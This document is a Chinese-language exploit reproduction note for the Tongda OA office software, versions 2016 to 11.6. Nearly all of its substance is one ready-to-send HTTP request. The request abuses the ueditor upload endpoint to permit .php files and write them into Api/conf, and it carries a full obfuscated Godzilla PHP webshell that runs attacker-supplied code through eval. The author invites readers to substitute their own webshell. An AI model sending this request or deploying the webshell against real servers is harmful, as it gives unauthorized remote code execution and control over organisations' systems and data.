# 0x00 软件介绍
通达OA：一款在中国流行的php开发的OA软件

# 0x01 复现环境
使用环境：windows 2008  
复现版本：无

# 0x02 环境搭建
无

# 0x03 利用条件
无

# 0x04 影响版本
2016-11.6

# 0x05 漏洞复现
攻击环境：kali x64

攻击payload如下，替换其中的php代码部分为你的webshell即可，我这里用的是哥斯拉生成的php webshell：
```
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------157569659620694477453109954647
Content-Length: 879
Connection: close
Cookie: PHPSESSID=t0a1f7nd58egc83cnpv045iua4; KEY_RANDOMDATA=16407
Upgrade-Insecure-Requests: 1

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ff
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

Api/conf
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="ff"; filename="xxxaaaa.php"
Content-Type: text/plain

<?php
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='Pass_v1';
    $V='payload';
    $T='3c6e0b8a9c15224a';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }

-----------------------------157569659620694477453109954647
Content-Disposition: form-data; name="mufile"

提交查询
-----------------------------157569659620694477453109954647--
```
如下图  
![image](./0.png)

# 0x06 批量脚本
无

# 0x07 踩坑记录
无

# 0x08 参考链接
https://wiki.wgpsec.org/knowledge/
